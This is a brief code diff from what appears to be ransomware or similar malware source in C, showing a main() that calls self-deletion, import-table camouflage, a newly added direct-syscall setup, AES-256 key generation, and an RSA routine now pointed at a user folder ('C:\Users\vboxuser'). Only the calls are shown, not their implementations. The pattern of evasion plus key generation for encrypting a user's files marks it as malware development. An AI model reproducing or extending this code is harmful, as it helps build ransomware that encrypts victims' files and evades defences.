@@ -104,12 +104,13 @@ int main() {
 		SelfDeletion();
 		IatCamouflage();
 		InitializeModules();
+		InitializeSysCalls();
 
 		//GoodFunction();
 		uint8_t keyValue[AES_256_KEY_SIZE];
 		uint8_t iv[IV_SIZE];
 		GenerateKey(keyValue,iv);
-		RSAwork(keyValue);
+		RSAwork(keyValue, L"C:\\Users\\vboxuser");
 
 		//Pubkey();
 
